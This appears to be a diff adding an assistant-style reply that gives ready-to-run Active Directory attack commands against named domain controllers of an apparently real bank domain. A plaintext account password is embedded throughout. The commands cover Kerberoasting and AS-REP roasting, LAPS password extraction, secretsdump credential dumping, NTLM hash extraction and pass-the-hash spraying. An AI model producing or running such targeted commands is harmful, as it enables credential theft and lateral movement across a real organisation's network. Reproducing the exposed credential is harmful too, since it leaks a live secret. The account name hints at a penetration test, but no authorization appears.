@@ -1,0 +1,155 @@
+Here are all the commands with your specific credentials and domains:
+
+## **1. Initial Authentication Tests**
+```bash
+# Set variables
+USERNAME="vaptsupport2"
+PASSWORD="P\$ssme\$111"
+DOMAIN="FBNMERCHANTBANK.COM"
+DC1="mbd2-srvdc-101.FBNMERCHANTBANK.COM"
+DC2="mbd1-srvdc-102.FBNMERCHANTBANK.COM" 
+DC3="mbd1-srvdc-101.FBNMERCHANTBANK.COM"
+
+# Test each DC
+ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
+
+ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
+
+ldapsearch -x -H ldap://$DC3 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
+```
+
+## **2. Computer Enumeration**
+```bash
+# Get all domain computers from each DC
+ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(objectCategory=computer)" name | grep "name:" | awk '{print $2}' > computers_dc1.txt
+
+ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(objectCategory=computer)" name | grep "name:" | awk '{print $2}' > computers_dc2.txt
+
+# Check local admin on first few computers
+head -10 computers_dc1.txt | while read computer; do
+    crackmapexec smb $computer -u $USERNAME -p "$PASSWORD" -d $DOMAIN --local-auth
+done
+```
+
+## **3. Shares Enumeration**
+```bash
+# Enumerate shares on each DC
+crackmapexec smb $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
+crackmapexec smb $DC2 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
+crackmapexec smb $DC3 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
+
+# Browse SYSVOL on each DC
+smbclient -U "FBNMERCHANTBANK.COM/vaptsupport2%P\$ssme\$111" "//$DC1/SYSVOL" -c "ls; quit"
+smbclient -U "FBNMERCHANTBANK.COM/vaptsupport2%P\$ssme\$111" "//$DC2/SYSVOL" -c "ls; quit"
+```
+
+## **4. Kerberos Attacks**
+```bash
+# AS-REP Roasting on each DC
+python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -format hashcat -outputfile asrep_dc1.txt
+python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -format hashcat -outputfile asrep_dc2.txt
+
+# Kerberoasting on each DC
+python3 /home/vaptsupport2/impacket/examples/GetUserSPNs.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -outputfile kerberoast_dc1.txt
+python3 /home/vaptsupport2/impacket/examples/GetUserSPNs.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -outputfile kerberoast_dc2.txt
+
+# Find Delegation
+python3 /home/vaptsupport2/impacket/examples/findDelegation.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
+python3 /home/vaptsupport2/impacket/examples/findDelegation.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
+```
+
+## **5. LAPS Exploitation**
+```bash
+# Find LAPS passwords from each DC
+ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd distinguishedName > laps_dc1.txt
+ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd distinguishedName > laps_dc2.txt
+
+# Extract and test LAPS passwords
+grep -B1 "ms-MCS-AdmPwd:" laps_dc1.txt | grep "distinguishedName:" | cut -d, -f2 | cut -d= -f2 > laps_computers.txt
+grep "ms-MCS-AdmPwd:" laps_dc1.txt | cut -d: -f2- | sed 's/^ *//' > laps_passwords.txt
+
+# Test first LAPS computer
+if [ -s laps_computers.txt ]; then
+    first_computer=$(head -1 laps_computers.txt)
+    first_password=$(head -1 laps_passwords.txt)
+    crackmapexec smb $first_computer -u administrator -p "$first_password" -d $DOMAIN
+fi
+```
+
+## **6. GPO Checks**
+```bash
+# Enumerate GPOs
+ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "CN=Policies,CN=System,DC=FBNMERCHANTBANK,DC=COM" objectClass=groupPolicyContainer > gpos.txt
+
+# Check GPO vulnerabilities
+python3 /home/vaptsupport2/impacket/examples/gpovuln.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
+```
+
+## **7. MSSQL Exploitation**
+```bash
+# Find MSSQL instances
+python3 /home/vaptsupport2/impacket/examples/mssqlinstance.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" > mssql_instances.txt
+
+# Test connection to first MSSQL instance
+if [ -s mssql_instances.txt ]; then
+    first_mssql=$(head -1 mssql_instances.txt | awk '{print $1}')
+    python3 /home/vaptsupport2/impacket/examples/mssqlclient.py "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111@$first_mssql" -windows-auth -query "SELECT SYSTEM_USER;"
+fi
+```
+
+## **8. Credential Dumping**
+```bash
+# First find computers where you have local admin
+crackmapexec smb $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --local-auth | grep PWNED | awk '{print $4}' > pwned_machines.txt
+
+# Dump secrets from first pwned machine
+if [ -s pwned_machines.txt ]; then
+    first_pwned=$(head -1 pwned_machines.txt)
+    python3 /home/vaptsupport2/impacket/examples/secretsdump.py "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111@$first_pwned" > dump_$first_pwned.txt
+    
+    # Extract NTLM hashes
+    grep ".*:.*:[a-f0-9]\{32\}.*" dump_$first_pwned.txt | cut -d: -f4 > ntlm_hashes.txt
+fi
+```
+
+## **9. BloodHound Collection**
+```bash
+# Collect BloodHound data from primary DC
+python3 /home/vaptsupport2/BloodHound.py/bloodhound.py -d FBNMERCHANTBANK.COM -dc $DC1 -u vaptsupport2 -p "P\$ssme\$111" -c All,LoggedOn --zip
+```
+
+## **10. Quick Comprehensive Test**
+```bash
+# One-liner to test basic functionality across all DCs
+for DC in $DC1 $DC2 $DC3; do
+    echo "=== Testing $DC ==="
+    crackmapexec smb $DC -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
+    python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request 2>/dev/null | head -5
+    echo ""
+done
+```
+
+## **11. Password Spraying Preparation**
+```bash
+# If you get hashes from dumping, spray them
+if [ -s ntlm_hashes.txt ]; then
+    for hash in $(sort -u ntlm_hashes.txt | head -5); do
+        echo "Spraying hash: $hash"
+        crackmapexec smb --computers computers_dc1.txt -u administrator -H "$hash" -d $DOMAIN --no-bruteforce
+    done
+fi
+```
+
+## **12. Service-Specific Attacks**
+```bash
+# Check for WinRM access
+crackmapexec winrm $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
+
+# Check RDP access
+crackmapexec rdp $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
+
+# Check SSH access  
+crackmapexec ssh $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
+```
+
+**Start with the quick comprehensive test (#10) to see which DCs are responding, then focus on the ones that work!**
